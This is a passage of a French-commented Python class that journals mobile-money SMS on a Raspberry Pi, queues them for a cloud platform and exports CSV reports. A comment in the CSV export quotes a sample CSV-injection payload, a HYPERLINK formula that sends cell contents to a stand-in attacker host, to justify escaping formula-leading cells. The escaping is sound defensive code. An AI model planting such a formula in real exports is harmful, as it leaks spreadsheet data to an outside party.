            self.conn.commit()

    def recus_en_attente(self):
        with self.verrou:
            return self.conn.execute(
                "SELECT COUNT(*) FROM recus WHERE envoye = 0").fetchone()[0]

    # ---- sauvegarde --------------------------------------------------------
    def sauvegarder(self, chemin):
        """Copie cohérente du journal, même pendant que le robot écrit.
        Envoyée dans Telegram, elle constitue la seule copie hors du Pi."""
        destination = sqlite3.connect(chemin)
        # La copie porte exactement ce que porte l'original : elle se referme
        # de la même façon, et AVANT d'être remplie. Une sauvegarde laissée
        # en 0644 le temps du transfert annulerait le soin pris sur le
        # journal lui-même.
        refermer(chemin)
        try:
            with self.verrou:
                self.conn.backup(destination)
        finally:
            destination.close()
        return chemin

    def dernier_evenement(self):
        """Texte du dernier événement journalisé, ou None si le journal est
        vierge. Sert à savoir si l'arrêt précédent était propre."""
        with self.verrou:
            ligne = self.conn.execute(
                "SELECT texte FROM evenements ORDER BY id DESC LIMIT 1").fetchone()
        return ligne[0] if ligne else None

    def derniers_sms(self, n=5, iccids=()):
        """[(date, expéditeur, texte, compte)] du plus récent au plus ancien,
        limité aux cartes indiquées si `iccids` est fourni."""
        clause, params = self._filtre_cartes(iccids)
        with self.verrou:
            return self.conn.execute(
                "SELECT date, expediteur, texte, COALESCE(compte, '') "
                f"FROM sms WHERE 1=1{clause} ORDER BY id DESC LIMIT ?",
                params + (n,)).fetchall()

    # ---- file d'attente vers le cloud -------------------------------------
    # Le journal local reste la source de vérité : une ligne n'est marquée
    # envoyée qu'une fois le cloud confirmé. Une coupure réseau ne perd rien,
    # elle ne fait qu'allonger la file.

    def lire_memo(self, cle):
        """Une valeur de la mémoire du robot, ou None."""
        with self.verrou:
            ligne = self.conn.execute(
                "SELECT valeur FROM memos WHERE cle = ?", (cle,)).fetchone()
        return ligne[0] if ligne else None

    def ecrire_memo(self, cle, valeur):
        with self.verrou:
            self.conn.execute(
                "INSERT INTO memos(cle, valeur) VALUES(?, ?) "
                "ON CONFLICT(cle) DO UPDATE SET valeur = excluded.valeur",
                (cle, str(valeur)))
            self.conn.commit()

    def remettre_sms_a_transmettre(self):
        """Remet TOUS les SMS dans la file vers le cloud, et dit combien.

        Sert quand le lecteur de SMS s'améliore : chaque message est relu au
        moment de l'envoi, et la plateforme reçoit la nouvelle lecture — le
        texte d'origine, lui, ne bouge jamais.
        """
        with self.verrou:
            n = self.conn.execute(
                "UPDATE sms SET envoye = 0 "
                "WHERE COALESCE(envoye, 0) != 0").rowcount
            self.conn.commit()
        return n

    def sms_non_envoyes(self, limite=100):
        """[(id, date, expéditeur, texte, compte, iccid, emis_le)] à transmettre."""
        with self.verrou:
            return self.conn.execute(
                "SELECT id, date, expediteur, texte, COALESCE(compte, ''), "
                "COALESCE(iccid, ''), emis_le "
                "FROM sms WHERE COALESCE(envoye, 0) = 0 ORDER BY id LIMIT ?",
                (limite,)).fetchall()

    def evenements_non_envoyes(self, limite=100):
        with self.verrou:
            return self.conn.execute(
                "SELECT id, date, texte FROM evenements "
                "WHERE COALESCE(envoye, 0) = 0 ORDER BY id LIMIT ?",
                (limite,)).fetchall()

    def marquer_sms_envoyes(self, ids):
        self._marquer("sms", ids)

    def marquer_evenements_envoyes(self, ids):
        self._marquer("evenements", ids)

    def _marquer(self, table, ids):
        if not ids:
            return
        with self.verrou:
            self.conn.executemany(
                f"UPDATE {table} SET envoye = 1 WHERE id = ?",
                [(i,) for i in ids])
            self.conn.commit()

    def sms_en_attente(self):
        """Combien de SMS le robot a relevés mais pas encore transmis au cloud.

        Distinct de `reste_a_envoyer` (qui compte aussi les événements et les
        cartes, souvent en transit) : c'est ce compteur-ci qui dit à la liste
        des SMS si elle est complète, sans la faire clignoter pour un simple
        événement en attente."""
        with self.verrou:
            (n,) = self.conn.execute(
                "SELECT COUNT(*) FROM sms WHERE COALESCE(envoye,0)=0").fetchone()
        return n

    def reste_a_envoyer(self):
        """Combien de lignes attendent encore le cloud."""
        with self.verrou:
            (n,) = self.conn.execute(
                "SELECT (SELECT COUNT(*) FROM sms WHERE COALESCE(envoye,0)=0) "
                "+ (SELECT COUNT(*) FROM evenements WHERE COALESCE(envoye,0)=0) "
                "+ (SELECT COUNT(*) FROM cartes WHERE COALESCE(envoye,0)=0)"
            ).fetchone()
        return n

    def rapport_du_jour(self, iccids=(), numeros=()):
        """(nb d'encaissements, total FCFA, nb de SMS) sur les dernières 24 h,
        limité aux cartes indiquées si `iccids` est fourni.

        Le cloisonnement compte ici plus qu'ailleurs : additionner les recettes
        de deux cartes différentes donnerait un total qui ne correspond à aucun
        solde réel.

        `numeros` : les numéros de nos cartes, pour trancher le sens des
        transferts qui nomment leurs deux parties. Sans eux, le bilan et la
        plateforme se contredisaient : elle comptait un encaissement, lui
        rien — même SMS, deux lectures.
        """
        depuis = (datetime.now() - timedelta(days=1)).isoformat(timespec="seconds")
        clause, params = self._filtre_cartes(iccids)
        with self.verrou:
            lignes = self.conn.execute(
                f"SELECT texte FROM sms WHERE date >= ?{clause}",
                (depuis,) + params).fetchall()
        nums = tuple(numeros) or tuple(self.numeros_declares())
        nb, total = 0, 0
        for (texte,) in lignes:
            montant = montant_recu(texte, numeros=nums)
            if montant is not None:
                nb += 1
                total += montant
        return nb, total, len(lignes)

    def rapport_par_carte(self, iccids=(), numeros=()):
        """[(iccid, libelle, nb, total)] sur les dernières 24 h — une ligne
        par caisse, dans l'ordre d'arrivée des SMS.

        Additionner deux caisses donne un chiffre qui ne correspond à aucun
        solde réel : dès qu'il y a deux cartes, c'est cette ventilation qui
        fait foi — le total fusionné de `rapport_du_jour` n'est plus qu'une
        commodité. Les SMS d'avant le cloisonnement (sans ICCID) sortent
        sous la clé ''.
        """
        depuis = (datetime.now() - timedelta(days=1)).isoformat(timespec="seconds")
        clause, params = self._filtre_cartes(iccids)
        with self.verrou:
            lignes = self.conn.execute(
                "SELECT texte, COALESCE(iccid, ''), COALESCE(compte, '') "
                f"FROM sms WHERE date >= ?{clause} ORDER BY id",
                (depuis,) + params).fetchall()
        nums = tuple(numeros) or tuple(self.numeros_declares())
        caisses = {}
        for texte, iccid, compte in lignes:
            caisse = caisses.setdefault(iccid, ["", 0, 0])
            if compte:
                caisse[0] = compte      # le dernier libellé connu de la carte
            montant = montant_recu(texte, numeros=nums)
            if montant is not None:
                caisse[1] += 1
                caisse[2] += montant
        return [(iccid, libelle, nb, total)
                for iccid, (libelle, nb, total) in caisses.items()]

    def export_csv(self, jours=7, iccids=(), numeros=()):
        """Journal en CSV (octets), prêt pour Excel ou la comptabilité.

        Chaque SMS compris devient une ligne exploitable : qui a payé, combien,
        sous quelle référence. Le message d'origine reste en dernière colonne,
        c'est lui qui fait foi. `numeros` : voir `rapport_du_jour` — le sens
        des transferts à deux parties en dépend."""
        depuis = (datetime.now() - timedelta(days=jours)).isoformat(timespec="seconds")
        clause, params = self._filtre_cartes(iccids)
        with self.verrou:
            lignes = self.conn.execute(
                "SELECT date, expediteur, texte, COALESCE(compte, ''), "
                "COALESCE(iccid, '') "
                f"FROM sms WHERE date >= ?{clause} ORDER BY id",
                (depuis,) + params).fetchall()
        tampon = io.StringIO()
        plume = csv.writer(tampon, delimiter=";")

        def _cellule(valeur):
            # Un tableur lit une cellule qui commence par « = + - @ » (ou une
            # tabulation) comme une FORMULE. Un SMS piégé
            # « =HYPERLINK("http://vol.example"&A1,"clic") » s'exécuterait à
            # l'ouverture du fichier, dans le compte du propriétaire. On
            # préfixe ces cellules d'une apostrophe : le tableur les affiche
            # comme du texte, la valeur reste lisible.
            s = "" if valeur is None else str(valeur)
            return "'" + s if s[:1] in "=+-@\t\r" else s
        # Les en-têtes et le sens se traduisent AU MOMENT de l'export : la
        # base, elle, garde ses valeurs telles quelles.
        plume.writerow(t(
            ["date", "account", "card", "direction", "amount_fcfa",
             "party", "number", "reference", "balance_after", "message"],
            ["date", "compte", "carte", "sens", "montant_fcfa",
             "tiers", "numero", "reference", "solde_apres", "message"]))
        sens_dits = {"entree": t("received", "reçu"),
                     "sortie": t("sent", "envoyé")}
        nums = tuple(numeros) or tuple(self.numeros_declares())
        for date, expediteur, texte, compte, ligne_iccid in lignes:
            p = analyser(texte, numeros=nums)
            plume.writerow([_cellule(v) for v in (
                date.replace("T", " "), compte or expediteur, ligne_iccid,
                sens_dits.get(p.sens if p else "", ""),
                p.montant if p else "",
                p.tiers if p else "",
                (p.numero or "") if p else "",
                (p.reference or "") if p else "",
                (p.solde_apres or "") if p else "",
                texte.replace("\n", " "),
            )])
        # BOM : Excel ouvre alors correctement les accents.
        return b"\xef\xbb\xbf" + tampon.getvalue().encode("utf-8")


def montant_recu(texte, numeros=()):
    """Montant en FCFA d'un encaissement, sinon None.

    Délègue à l'analyseur de SMS, qui sait distinguer un vrai paiement d'une
    publicité (« gagnez 1000 FCFA de bonus ») ou d'un code de vérification —
    lesquels étaient auparavant comptés comme des recettes.

    `numeros` : nos numéros, pour trancher le sens d'un transfert à deux
    parties — sans eux, ces encaissements-là restaient hors du bilan."""
    p = analyser(texte, numeros=numeros)
    return p.montant if p and p.sens == "entree" else None
